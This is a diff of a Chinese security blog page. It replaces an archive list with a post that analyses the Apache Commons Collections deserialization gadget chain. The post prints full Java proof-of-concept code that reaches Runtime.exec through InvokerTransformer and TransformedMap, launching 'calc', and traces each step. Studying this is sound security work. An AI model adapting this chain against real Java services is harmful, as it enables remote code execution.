@@ -6,15 +6,30 @@
   <meta name="renderer" content="webkit">
   <meta http-equiv="X-UA-Compatible" content="IE=edge" >
   <link rel="dns-prefetch" href="http://budebao.github.io">
-  <title>Archives: 2018 | 零点维度</title>
+  <title>Commons CollectionsPoc函数链执行过程分析 | 零点维度</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-  <meta property="og:type" content="website">
-<meta property="og:title" content="零点维度">
-<meta property="og:url" content="http://budebao.github.io/archives/2018/index.html">
+  <meta name="description" content="import org.apache.commons.collections.functors.InvokerTransformer; import org.apache.commons.collections.Transformer; import java.lang.StringBuffer; import org.apache.commons.collections.functors.Cha">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Commons CollectionsPoc函数链执行过程分析">
+<meta property="og:url" content="http://budebao.github.io/2018/11/17/Commons CollectionsPoc函数链执行过程分析上/index.html">
 <meta property="og:site_name" content="零点维度">
+<meta property="og:description" content="import org.apache.commons.collections.functors.InvokerTransformer; import org.apache.commons.collections.Transformer; import java.lang.StringBuffer; import org.apache.commons.collections.functors.Cha">
 <meta property="og:locale" content="zh-CN">
+<meta property="og:image" content="https://s1.ax1x.com/2018/11/16/ixqcKx.png">
+<meta property="og:image" content="https://s1.ax1x.com/2018/11/16/ixLAdU.png">
+<meta property="og:image" content="https://s1.ax1x.com/2018/11/16/izpgsJ.md.png">
+<meta property="og:image" content="https://s1.ax1x.com/2018/11/16/izpWZR.md.png">
+<meta property="og:image" content="https://s1.ax1x.com/2018/11/17/izVOeO.md.png">
+<meta property="og:image" content="https://s1.ax1x.com/2018/11/17/izmhTS.md.png">
+<meta property="og:image" content="https://s1.ax1x.com/2018/11/17/izmIYQ.md.png">
+<meta property="og:image" content="https://s1.ax1x.com/2018/11/17/izm7Ss.md.png">
+<meta property="og:image" content="https://s1.ax1x.com/2018/11/17/izmbyq.md.png">
+<meta property="og:image" content="https://s1.ax1x.com/2018/11/17/izmqO0.md.png">
+<meta property="og:updated_time" content="2018-12-08T09:05:33.925Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="零点维度">
+<meta name="twitter:title" content="Commons CollectionsPoc函数链执行过程分析">
+<meta name="twitter:description" content="import org.apache.commons.collections.functors.InvokerTransformer; import org.apache.commons.collections.Transformer; import java.lang.StringBuffer; import org.apache.commons.collections.functors.Cha">
+<meta name="twitter:image" content="https://s1.ax1x.com/2018/11/16/ixqcKx.png">
   
     <link rel="alternative" href="/atom.xml" title="零点维度" type="application/atom+xml">
   
@@ -53,9 +68,9 @@
 		<nav class="header-menu">
 			<ul>
 			
-				<li><a href="../../index.html">主页</a></li>
+				<li><a href="../../../../index.html">主页</a></li>
 	        
-				<li><a href="../../tags/随笔/">随笔</a></li>
+				<li><a href="../../../../tags/随笔/">随笔</a></li>
 	        
 			</ul>
 		</nav>
@@ -133,9 +148,9 @@
 				<ul style="width: 50%">
 				
 				
-					<li style="width: 50%"><a href="../../index.html">主页</a></li>
+					<li style="width: 50%"><a href="../../../../index.html">主页</a></li>
 		        
-					<li style="width: 50%"><a href="../../tags/随笔/">随笔</a></li>
+					<li style="width: 50%"><a href="../../../../tags/随笔/">随笔</a></li>
 		        
 				</ul>
 			</nav>
@@ -150,331 +165,215 @@
             <canvas data-colors="#eaeaea" data-sectionHeight="100" data-contentId="js-content" id="myCanvas1" class="anm-canvas"></canvas>
           </div>
           <div id="js-content" class="content-ll">
-            
-  
-  
+            <article id="post-Commons CollectionsPoc函数链执行过程分析上" class="article article-type-post " itemscope itemprop="blogPost">
+  <div class="article-inner">
     
-    
-      
-      
-      <section class="archives-wrap">
-        <div class="archive-year-wrap">
-          <a href="" class="archive-year">2018</a>
-        </div>
-        <div class="archives">
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="../../2018/11/17/Commons CollectionsPoc函数链执行过程分析下/" class="archive-article-date">
-  	<time datetime="2018-11-17T06:23:57.085Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2018-11-17</time>
-</a>
-        </div>
-    	 
+      <header class="article-header">
+        
   
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="../../2018/11/17/Commons CollectionsPoc函数链执行过程分析下/">Commons CollectionsPoc函数链执行过程分析下</a>
+    <h1 class="article-title" itemprop="name">
+      Commons CollectionsPoc函数链执行过程分析
     </h1>
   
 
-        <div class="article-info info-on-right">
-          
-          
-
-        </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
-  
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="../../2018/11/17/Commons CollectionsPoc函数链执行过程分析上/" class="archive-article-date">
+        
+        <a href="" class="archive-article-date">
   	<time datetime="2018-11-17T04:17:14.212Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2018-11-17</time>
 </a>
-        </div>
-    	 
-  
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="../../2018/11/17/Commons CollectionsPoc函数链执行过程分析上/">Commons CollectionsPoc函数链执行过程分析</a>
-    </h1>
-  
+        
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <a id="more"></a>
+<pre><code>import org.apache.commons.collections.functors.InvokerTransformer;
+import org.apache.commons.collections.Transformer;
+import java.lang.StringBuffer;
+import org.apache.commons.collections.functors.ChainedTransformer;
+import org.apache.commons.collections.functors.ConstantTransformer;
+import org.apache.commons.collections.map.TransformedMap;
+import java.lang.reflect.Field;
+import java.util.HashMap;
+import java.util.Iterator;
+import java.util.Map;
+import java.util.Set;
+public class Main{
+public  static  void main(String[] args){
 
-        <div class="article-info info-on-right">
-          
-          
+Transformer[] transformers = new Transformer[]{
+new ConstantTransformer(Runtime.class),
+new InvokerTransformer(&quot;getMethod&quot;, new Class[]{String.class,Class[].class},
+new Object[]{&quot;getRuntime&quot;, new Class[0]}),
+new InvokerTransformer(&quot;invoke&quot;, new Class[]{Object.class,Object[].class},
+new Object[]{null, new Object[0]}),
+new InvokerTransformer(&quot;exec&quot;, new Class[]{String.class},
+new Object[]{&quot;calc&quot;})
+};
+Transformer chain = new ChainedTransformer(transformers) ;
+Map innerMap = new HashMap() ;
+innerMap.put(&quot;name&quot;, &quot;hello&quot;) ;
+Map outerMap = TransformedMap.decorate(innerMap, null, chain) ;
 
+Map.Entry elEntry = (Map.Entry) outerMap.entrySet().iterator().next() ;
+elEntry.setValue(&quot;hello&quot;) ;
+
+}
+}
+</code></pre><p>&nbsp;&nbsp;这是POC代码<br><br>&nbsp;&nbsp;下面看一下这个POC具体的执行过程<br><br>&nbsp;&nbsp;1，第一步创建一个Transformer类型的数组，由于ConstantTransformer和InvokerTransformer<br>都是Transfromer派生的子类,因而能够被添加到Transformer数组中,创建这个数组的目的就是把后面要执行的函数放入里面，也就构成了一个函数链<br><br>&nbsp;&nbsp;2,第二步就是把transformers当做参数创建一个chainedTransformer对象,而chainedTransformer类有个方法就是就是将一个函数数组链式的执行。<br><br>&nbsp;&nbsp;3,     <code>Map innerMap = new HashMap() ;
+                   innerMap.put(&quot;name&quot;, &quot;hello&quot;) ;
+                   Map outerMap = TransformedMap.decorate(innerMap, null, chain) ;</code><br>这三行代码先创建一个Map对象，并用TransformedMap将这个用上面创建的chain函数执行链对Map对象进行包装，<br><br><br>&nbsp;&nbsp;4,<code>Map.Entry elEntry = (Map.Entry) outerMap.entrySet().iterator().next() ;</code><br>将Map中的键和值作为对象存在set集合中，并使用迭代器获取一个对象<br><br>&nbsp;&nbsp;5,<code>elEntry.setValue(&quot;hello&quot;) ;</code>修改这个对象的值。看一下这个方法的代码。<br><br><img src="https://s1.ax1x.com/2018/11/16/ixqcKx.png" alt="ixqcKx.png"><br><br>&nbsp;&nbsp;修改值会触发ChainedTransformer的transform也就是会触发函数的链式执行<br><br><img src="https://s1.ax1x.com/2018/11/16/ixLAdU.png" alt="ixLAdU.png"><br><br><a href="https://imgchr.com/i/izpgsJ" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/11/16/izpgsJ.md.png" alt="izpgsJ.md.png"></a><br></p>
+<p><br><br>&nbsp;&nbsp;第一次执行，传入的是字符串对象”hello”,即传入object为”hello”,object = this.iTransformers[i].transform(object);执行数组中的第一个对象为 new ConstantTransformer(Runtime.class),.transform(object),ConstantTransformer类的transform的方法为返回iConstant，而这里的iconstant是Runtime.class一个类的对象,object随之也被赋值为Runtime.class.<br><br><a href="https://imgchr.com/i/izpWZR" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/11/16/izpWZR.md.png" alt="izpWZR.md.png"></a><br><br><br><a href="https://imgchr.com/i/izVOeO" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/11/17/izVOeO.md.png" alt="izVOeO.md.png"></a><br><br><br>第二次执行,传入的参数为java.lang.Runtime,执行数组中第二个对象的transform的方法，第二个对象类型InvokerTransformer，所以执行InvokerTransformer类的tranforms方法，<br><br>先是获取一个java.lang的类,借用java的反射机制获取类的方法这里获取的是Class类的get<br>method方法，然后用invoke执行getmethod方法获取getRuntime类的对象并作为返回值返回,object的值为变为<br>getRuntime类的对象，<br><br><br><br><a href="https://imgchr.com/i/izmhTS" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/11/17/izmhTS.md.png" alt="izmhTS.md.png"></a><br><br><a href="https://imgchr.com/i/izmIYQ" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/11/17/izmIYQ.md.png" alt="izmIYQ.md.png"></a><br><br><br>第三次执行传入的参数为getRuntime类的对象，数组第三个对象也是<br>InvokerTransformer类的对象，执行InvokerTransformer类的transform方法，获取一个java.lang.reflect<br>.method类，获取invoke方法，然后执行 invoke(java.lang.Runtime.getRuntime,new Object[]{null, new Object[0]})返回java.lang.Runtime对象，并赋给object,<br><br><a href="https://imgchr.com/i/izm7Ss" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/11/17/izm7Ss.md.png" alt="izm7Ss.md.png"></a><br><br><br><a href="https://imgchr.com/i/izmbyq" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/11/17/izmbyq.md.png" alt="izmbyq.md.png"></a><br><br><br>第四次执行,传入的参数为java.lang.Runtime,，数组第四个对象也是<br>InvokerTransformer类的对象,执行InvokerTransformer类的transform方法,获取到java.lang.runtime类<br>，获取ava.lang.runtime类中的exec方法，最后执行method.invoke(“Runtime,new object[]{“calc”})<br>成功弹出计算器。<br><a href="https://imgchr.com/i/izmqO0" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/11/17/izmqO0.md.png" alt="izmqO0.md.png"></a></p>
+
+      
+      
+        <div class="page-reward">
+          <a href="javascript:;" class="page-reward-btn tooltip-top">
+            <div class="tooltip tooltip-east">
+            <span class="tooltip-item">
+              赏
+            </span>
+            
+            <span class="tooltip-content">
+              <span class="tooltip-text">
+                <span class="tooltip-inner">
+                  
+                  <p class="reward-p"><i class="icon icon-quo-left"></i>谢谢你请我吃糖果<i class="icon icon-quo-right"></i></p>
+                  <div class="reward-box">
+                    
+                    
+                    
+                  </div>
+                  
+                </span>
+              </span>
+            </span>
+            
+          </div>
+         
+          </a>
+         
         </div>
-        <div class="clearfix"></div>
-    </header>
+        
+      
+      
+    </div>
+   
+    <div class="article-info article-info-index">
+    <span id="busuanzi_container_page_pv">
+                           本文总阅读量<span id="busuanzi_value_page_pv"></span>次
+                  </span>
+      
+      
+      
+
+      
+
+      
+        
+<div class="share-btn share-icons tooltip-left">
+  <div class="tooltip tooltip-east">
+    <span class="tooltip-item">
+      <a href="javascript:;" class="share-sns share-outer">
+        <i class="icon icon-share"></i>
+      </a>
+    </span>
+    <span class="tooltip-content">
+      <div class="share-wrap">
+        <div class="share-icons">
+          <a class="weibo share-sns" href="javascript:;" data-type="weibo">
+            <i class="icon icon-weibo"></i>
+          </a>
+          <a class="weixin share-sns wxFab" href="javascript:;" data-type="weixin">
+            <i class="icon icon-weixin"></i>
+          </a>
+          <a class="qq share-sns" href="javascript:;" data-type="qq">
+            <i class="icon icon-qq"></i>
+          </a>
+          <a class="douban share-sns" href="javascript:;" data-type="douban">
+            <i class="icon icon-douban"></i>
+          </a>
+          <a class="qzone share-sns" href="javascript:;" data-type="qzone">
+            <i class="icon icon-qzone"></i>
+          </a>
+          <a class="facebook share-sns" href="javascript:;" data-type="facebook">
+            <i class="icon icon-facebook"></i>
+          </a>
+          <a class="twitter share-sns" href="javascript:;" data-type="twitter">
+            <i class="icon icon-twitter"></i>
+          </a>
+          <a class="google share-sns" href="javascript:;" data-type="google">
+            <i class="icon icon-google"></i>
+          </a>
+        </div>
+      </div>
+    </span>
+  </div>
+</div>
+
+<div class="page-modal wx-share js-wx-box">
+    <a class="close js-modal-close" href="javascript:;"><i class="icon icon-close"></i></a>
+    <p>扫一扫，分享到微信</p>
+    <div class="wx-qrcode">
+      <img src="//pan.baidu.com/share/qrcode?url=http://budebao.github.io/2018/11/17/Commons CollectionsPoc函数链执行过程分析上/" alt="微信分享二维码">
+    </div>
+</div>
+
+<div class="mask js-mask"></div>
+      
+      <div class="clearfix"></div>
+    </div>
   </div>
 </article>
+
   
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="../../2018/11/03/java反序列漏洞，及从java-deserialization-from-discovery-to-reverse-shell-on-limited-environments收获的东西/" class="archive-article-date">
-  	<time datetime="2018-11-03T08:01:23.605Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2018-11-03</time>
-</a>
+<nav id="article-nav">
+  
+    <a href="../Commons CollectionsPoc函数链执行过程分析下/" id="article-nav-newer" class="article-nav-link-wrap">
+      <i class="icon-circle-left"></i>
+      <div class="article-nav-title">
+        
+          Commons CollectionsPoc函数链执行过程分析下
+        
+      </div>
+    </a>
+  
+  
+    <a href="../../03/java反序列漏洞，及从java-deserialization-from-discovery-to-reverse-shell-on-limited-environments收获的东西/" id="article-nav-older" class="article-nav-link-wrap">
+      <div class="article-nav-title">java反序列漏洞，及从java-deserialization-from-discovery-to-reverse-shell-on-limited-environments收获的东西</div>
+      <i class="icon-circle-right"></i>
+    </a>
+  
+</nav>
+
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
         </div>
-    	 
+        
+        
+    </div>
+</aside>
+
+
+
   
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="../../2018/11/03/java反序列漏洞，及从java-deserialization-from-discovery-to-reverse-shell-on-limited-environments收获的东西/">java反序列漏洞，及从java-deserialization-from-discovery-to-reverse-shell-on-limited-environments收获的东西</a>
-    </h1>
+  
   
 
-        <div class="article-info info-on-right">
-          
-          
-
-        </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
-  
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="../../2018/04/11/单词长度/" class="archive-article-date">
-  	<time datetime="2018-04-11T11:33:00.398Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2018-04-11</time>
-</a>
-        </div>
-    	 
-  
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="../../2018/04/11/单词长度/">单词长度</a>
-    </h1>
   
 
-        <div class="article-info info-on-right">
-          
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color4">C语言</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-          
-
-        </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
-  
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="../../2018/03/21/ewebeditor在线编辑器漏洞/" class="archive-article-date">
-  	<time datetime="2018-03-21T13:07:35.026Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2018-03-21</time>
-</a>
-        </div>
-    	 
-  
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="../../2018/03/21/ewebeditor在线编辑器漏洞/">ewebeditor在线编辑器漏洞</a>
-    </h1>
   
 
-        <div class="article-info info-on-right">
-          
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color5">渗透测试</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-          
-
-        </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
-  
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="../../2018/03/21/fck文件编辑器漏洞/" class="archive-article-date">
-  	<time datetime="2018-03-21T12:05:33.758Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2018-03-21</time>
-</a>
-        </div>
-    	 
-  
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="../../2018/03/21/fck文件编辑器漏洞/">fck文件编辑器漏洞</a>
-    </h1>
   
 
-        <div class="article-info info-on-right">
-          
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color5">渗透测试</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-          
-
-        </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
-  
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="../../2018/03/21/文件解析漏洞/" class="archive-article-date">
-  	<time datetime="2018-03-21T11:51:01.126Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2018-03-21</time>
-</a>
-        </div>
-    	 
-  
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="../../2018/03/21/文件解析漏洞/">windows常用dos命令，运行命令及快捷键</a>
-    </h1>
-  
-
-        <div class="article-info info-on-right">
-          
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color5">渗透测试</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-          
-
-        </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
-  
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="../../2018/03/13/SQL注入，sqlmap实战/" class="archive-article-date">
-  	<time datetime="2018-03-13T15:03:27.146Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2018-03-13</time>
-</a>
-        </div>
-    	 
-  
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="../../2018/03/13/SQL注入，sqlmap实战/">SQL注入，sqlmap实战</a>
-    </h1>
-  
-
-        <div class="article-info info-on-right">
-          
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color5">渗透测试</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-          
-
-        </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
-  
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="../../2018/03/13/windows常用dos命令，运行命令及快捷键 /" class="archive-article-date">
-  	<time datetime="2018-03-13T14:28:45.216Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2018-03-13</time>
-</a>
-        </div>
-    	 
-  
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="../../2018/03/13/windows常用dos命令，运行命令及快捷键 /">windows常用dos命令，运行命令及快捷键</a>
-    </h1>
-  
-
-        <div class="article-info info-on-right">
-          
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color5">渗透测试</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-          
-
-        </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
-  
-  
-    </div></section>
-  
-
-    
 
 
           </div>
@@ -501,8 +400,8 @@
 	var yiliaConfig = {
 		mathjax: false,
 		isHome: false,
-		isPost: false,
-		isArchive: true,
+		isPost: true,
+		isArchive: false,
 		isTag: false,
 		isCategory: false,
 		open_in_new: true,
